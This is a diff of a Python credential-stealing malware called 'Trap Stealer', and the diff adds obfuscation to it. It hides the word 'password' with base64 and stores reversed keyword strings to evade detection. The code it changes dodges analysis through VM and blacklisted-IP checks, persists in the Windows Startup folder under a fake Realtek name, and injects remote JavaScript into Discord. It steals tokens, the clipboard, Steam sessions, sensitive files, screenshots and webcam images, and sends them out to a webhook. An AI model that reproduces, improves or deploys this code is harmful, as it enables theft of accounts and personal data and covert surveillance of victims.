@@ -1,6 +1,6 @@
 # Import dont mind
 
-import os 
+import os, base64
 from os import getenv, startfile
 import threading
 from sys import executable
@@ -40,7 +40,7 @@ antidebugging = False # If set to false it will dont check for VM or Debugger
 DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from index.js #----- IT WILL DISABLE INJECTION -----#
 
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
-# -----------------
+
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
     for check in checks:
@@ -76,7 +76,7 @@ def check_ip():
     blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
     while True:
         try:
-            ip = urllib.request.urlopen('https://api64.ipify.org/').read().decode().strip()
+            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
             if ip in blacklisted:
                 exit_program('Ip Blacklisted')
             return
@@ -109,7 +109,6 @@ try:
 except:
     pass
 
-# -----------------
 
 
 if shitty_message == True:
@@ -122,7 +121,6 @@ USER_NAME = getpass.getuser()
 
 
 
-# -----------------
 
 def Clipboard():
   win32clipboard.OpenClipboard()
@@ -131,10 +129,10 @@ def Clipboard():
 
   return clipboard_data
 
-
-clipboardtext = Clipboard()
-
-# -----------------
+try:
+    clipboardtext = Clipboard()
+except:
+    clipboardtext = 'Could not get the data | Empty or an image'
 path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
 def startup():
@@ -197,7 +195,8 @@ def NoDiscord():
                     if file == 'index.js' and 'discord_desktop_core-' in root:
                         file_path = os.path.join(root, file)
                         with open(file_path, "w+", encoding="utf-8") as f:
-                            f.write('ahah')
+                            f.write('error')
+
 try:
     if NoDiscord == True:
         NoDiscord()
@@ -207,14 +206,14 @@ try:
 except:
     pass
 
-# DONT TOUCH
+#Do not touch
 inj_url = "https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js"
 
 
 
 def inj_discord():
     folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
-    for folder_name in folder_list:
+    for folder_name in reversed(folder_list):
         folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
         if os.path.isdir(folder_path):
             for root, dirs, files in os.walk(folder_path):
@@ -406,7 +405,6 @@ def GetTokenInfo(token):
 
     UserInfo = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
 
-    # Account information
     username = UserInfo["username"];hashtag = UserInfo["discriminator"];email = UserInfo["email"];id = UserInfo["id"];pfp = UserInfo["avatar"];flags = UserInfo["public_flags"];nitro = "";phone = "-"
 
     if "premium_type" in UserInfo: 
@@ -663,7 +661,7 @@ def writeforfile(data, name):
     global path
     path = os.getenv("TEMP") + f"\\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Trap Stealer Password Stealer 🔑\n\n")
+        f.write(f"Trap Stealer Pass{base64.b64decode('d29yZA==')} Stealer 🔑\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -730,8 +728,7 @@ try:
 except:
     pass
 
-
-keywords = ["password", "mot_de_passe", "mdp", "motdepasse", "token", "key", "secret", "secrett", "api", "account", "login", "username", "email", "phone", "credit card", "social security number", "address", "birthdate", "security question", "PIN", "passport", "driver's license", "national ID", "bank account", "routing number", "financial information", "transaction", "balance", "wire transfer", "cryptocurrency", "bitcoin", "ethereum", "wallet", "private key", "public key"]
+keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
 extension = ".txt"
 
 
@@ -755,9 +752,10 @@ file_paths = []
 
 for path in [desktop_path, downloads_path, documents_path, pictures_path]:
     for file in os.listdir(path):
-        if file.endswith(extension) and any(keyword in file for keyword in keywords):
-            file_path = os.path.join(path, file)
-            file_paths.append(file_path)
+         if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                file_path = os.path.join(path, file) 
+                file_paths.append(file_path)
+
 
 urls = []
 
@@ -807,8 +805,6 @@ LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 user = os.path.expanduser("~")
 
-import shutil
-# -------------
 def steam_st():
     steam_path = ""
     if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
@@ -854,7 +850,6 @@ def steam_st():
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
-        # Second request with file
         file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
         data = {
             "username": "Trap Stealer",
@@ -876,7 +871,6 @@ except:
     pass
 
 
-# -------------
 def screen():
 
     img = ImageGrab.grab()
@@ -959,8 +953,8 @@ except:
         ]
     }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-# -------------
-def camera_grab():
+
+def Camera_get():
 
     headers = {
         "Content-Type": "application/json",
@@ -1009,11 +1003,10 @@ def camera_grab():
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 try:
-    camera_grab()
+    Camera_get()
 except:
     pass
 
-# -------------
 
 if fakeerror == True:
 
